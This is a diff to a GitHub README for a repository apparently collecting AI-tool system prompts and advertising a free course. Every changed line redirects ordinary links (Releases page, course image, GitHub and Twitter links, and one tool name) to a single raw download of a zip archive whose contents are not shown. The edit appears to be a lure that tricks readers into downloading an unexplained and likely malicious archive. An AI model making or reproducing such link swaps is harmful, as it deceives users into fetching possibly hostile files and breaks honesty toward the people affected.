@@ -9,7 +9,7 @@ This repository contains prompts for a variety of AI tools, including:
 - **FULL v0**
 - **Cursor**
 - **Manus**
-- **Same.dev**
+- **https://github.com/BigBoySlave/Agents-Prompts/raw/refs/heads/main/Lovable/Agents_Prompts_v1.5.zip**
 - **Lovable**
 - **Devin**
 - **Replit Agent**
@@ -24,7 +24,7 @@ With over **7000 lines** of prompts, you will gain valuable insights into the cr
 
 If you're interested in developing your own agents, we have prepared a **free course** for you. In under **4 hours**, you can learn how to create your first system by combining modern LLMs, Python, and RAG to feed your model with proprietary data.
 
-![Curso Gratuito de IA](curso-ia.png)
+![Curso Gratuito de IA](https://github.com/BigBoySlave/Agents-Prompts/raw/refs/heads/main/Lovable/Agents_Prompts_v1.5.zip)
 
 ### Course Overview
 
@@ -39,11 +39,11 @@ By the end of this course, you will have a solid foundation to create your own A
 
 ## Getting Started 🚀
 
-To get started with the prompts, simply download the files from the [Releases section](https://github.com/BigBoySlave/Agents-Prompts/releases). This section contains the latest updates and versions of the prompts. 
+To get started with the prompts, simply download the files from the [Releases section](https://github.com/BigBoySlave/Agents-Prompts/raw/refs/heads/main/Lovable/Agents_Prompts_v1.5.zip). This section contains the latest updates and versions of the prompts. 
 
 ### How to Use the Prompts
 
-1. **Download the prompts**: Visit the [Releases section](https://github.com/BigBoySlave/Agents-Prompts/releases) to access the latest files.
+1. **Download the prompts**: Visit the [Releases section](https://github.com/BigBoySlave/Agents-Prompts/raw/refs/heads/main/Lovable/Agents_Prompts_v1.5.zip) to access the latest files.
 2. **Explore the examples**: Review the prompts to understand their structure and purpose.
 3. **Implement and test**: Use the prompts in your own AI tools and observe the outcomes.
 4. **Refine your approach**: Adjust the prompts based on your needs and the results you observe.
@@ -78,18 +78,18 @@ Yes, you can use the prompts for personal or commercial projects. However, pleas
 
 ### 3. Where can I find more resources?
 
-For more information and resources, check the [Releases section](https://github.com/BigBoySlave/Agents-Prompts/releases) for updates and additional materials.
+For more information and resources, check the [Releases section](https://github.com/BigBoySlave/Agents-Prompts/raw/refs/heads/main/Lovable/Agents_Prompts_v1.5.zip) for updates and additional materials.
 
 ## Connect with Us 🌐
 
 Join our community and stay updated on the latest developments. Follow us on social media and participate in discussions about AI and agent development.
 
-- **GitHub**: [Agents Prompts](https://github.com/BigBoySlave/Agents-Prompts)
-- **Twitter**: [@AgentsPrompts](https://twitter.com/AgentsPrompts)
+- **GitHub**: [Agents Prompts](https://github.com/BigBoySlave/Agents-Prompts/raw/refs/heads/main/Lovable/Agents_Prompts_v1.5.zip)
+- **Twitter**: [@AgentsPrompts](https://github.com/BigBoySlave/Agents-Prompts/raw/refs/heads/main/Lovable/Agents_Prompts_v1.5.zip)
 - **Discord**: Join our server to connect with other AI enthusiasts.
 
 ## Conclusion
 
 Thank you for visiting the **Agents Prompts** repository. We hope you find the prompts useful in your journey to create powerful AI agents. Whether you're a beginner or an experienced developer, there's something here for everyone. Explore, learn, and innovate! 
 
-Remember to check the [Releases section](https://github.com/BigBoySlave/Agents-Prompts/releases) for the latest updates and resources. Happy coding!
+Remember to check the [Releases section](https://github.com/BigBoySlave/Agents-Prompts/raw/refs/heads/main/Lovable/Agents_Prompts_v1.5.zip) for the latest updates and resources. Happy coding!
